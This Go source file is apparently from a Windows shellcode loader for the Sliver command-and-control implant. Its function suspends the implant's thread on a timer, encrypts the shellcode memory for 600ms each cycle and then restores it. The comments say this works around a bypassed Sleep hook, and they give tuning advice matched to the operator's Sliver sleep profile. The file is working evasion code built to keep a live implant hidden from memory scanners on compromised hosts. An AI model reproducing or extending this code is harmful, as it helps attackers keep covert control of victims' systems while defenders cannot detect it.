//go:build windows && amd64

// timerMaskLoop provides best-effort memory masking for Sliver shellcode that
// uses Go's time.Sleep (which routes through NtWaitForSingleObject, not
// kernel32!Sleep, and therefore bypasses the Sleep hook in hook.go).
//
// Strategy:
//  1. Wait for (SleepMS - 600ms) — arrive just before Sliver wakes up
//  2. Suspend the shellcode's primary OS thread
//  3. Encrypt shellcode memory
//  4. Sleep for 600ms (Sliver is still sleeping; its thread is suspended)
//  5. Decrypt
//  6. Resume the shellcode thread
//  7. Repeat
//
// The 600ms window is the mask duration: memory is encrypted for 600ms each
// cycle, then decrypted before Sliver needs to execute again.
//
// Tuning:
//   Set SleepMS to match your Sliver profile's --sleep value (in milliseconds).
//   The mask window is hardcoded at 600ms. For very short sleep intervals
//   (< 2s), timer masking is disabled to avoid suspending the shellcode while
//   it is actively executing.
package main

import (
	"runtime"
	"time"

	"golang.org/x/sys/windows"
)

// timerMaskLoop runs in a goroutine. hThread is the shellcode's primary thread
// (returned by ntCreateThread). It must remain open for the lifetime of the loop.
func timerMaskLoop(hThread windows.Handle) {
	// Bind this goroutine to its own OS thread so SuspendThread can safely
	// use GetCurrentThreadId to avoid suspending itself.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	sleepMs := intFromStr(SleepMS, 30000)
	if sleepMs < 2000 {
		// Too short to safely mask without racing execution.
		return
	}

	// Mask window: 600ms per cycle, starting 600ms before the interval ends.
	const maskWindowMs = 600
	waitBeforeMask := time.Duration(sleepMs-maskWindowMs) * time.Millisecond
	maskDuration := maskWindowMs * time.Millisecond

	// Initial delay: let Sliver initialize (connect to C2, complete first
	// callback) before starting the mask cycle.
	time.Sleep(time.Duration(sleepMs+3000) * time.Millisecond)

	for {
		time.Sleep(waitBeforeMask)

		// Suspend the shellcode thread.
		// SuspendThread returns the previous suspend count; -1 on error.
		if prev, _ := windows.SuspendThread(hThread); prev == ^uint32(0) {
			// Thread no longer exists — shellcode exited.
			return
		}

		encryptMemory()
		time.Sleep(maskDuration)
		decryptMemory()

		windows.ResumeThread(hThread) //nolint:errcheck
	}
}
